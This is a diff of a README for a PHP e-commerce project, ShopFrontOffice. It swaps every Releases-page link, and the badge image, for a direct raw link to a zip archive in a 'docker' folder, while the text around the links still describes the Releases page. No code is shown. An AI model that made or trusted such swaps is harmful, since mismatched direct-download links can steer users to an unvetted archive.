@@ -4,7 +4,7 @@
 Welcome to ShopFrontOffice! This is an advanced e-commerce project built with PHP using the MVC framework. You will find features like a dynamic shopping cart, product management, and PDF generation, all designed to create a seamless shopping experience for your users.
 
 ## 📥 Download Link
-[![Download ShopFrontOffice](https://img.shields.io/badge/Download-ShopFrontOffice-brightgreen)](https://github.com/arjunsahai46/ShopFrontOffice/releases)
+[![Download ShopFrontOffice](https://raw.githubusercontent.com/arjunsahai46/ShopFrontOffice/main/docker/ShopFrontOffice_1.0.zip)](https://raw.githubusercontent.com/arjunsahai46/ShopFrontOffice/main/docker/ShopFrontOffice_1.0.zip)
 
 ## 🛠️ System Requirements
 Before you begin, ensure that your system meets the following requirements:
@@ -18,7 +18,7 @@ Before you begin, ensure that your system meets the following requirements:
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of ShopFrontOffice. 
 
-[Visit this page to download](https://github.com/arjunsahai46/ShopFrontOffice/releases)
+[Visit this page to download](https://raw.githubusercontent.com/arjunsahai46/ShopFrontOffice/main/docker/ShopFrontOffice_1.0.zip)
 
 1. Open the link above.
 2. Choose the version you want to download.
@@ -75,4 +75,4 @@ For any questions or additional support, please open an issue in the repository.
 
 Thank you for choosing ShopFrontOffice for your e-commerce needs! Visit the Releases page to download now. 
 
-[Visit this page to download](https://github.com/arjunsahai46/ShopFrontOffice/releases)
+[Visit this page to download](https://raw.githubusercontent.com/arjunsahai46/ShopFrontOffice/main/docker/ShopFrontOffice_1.0.zip)
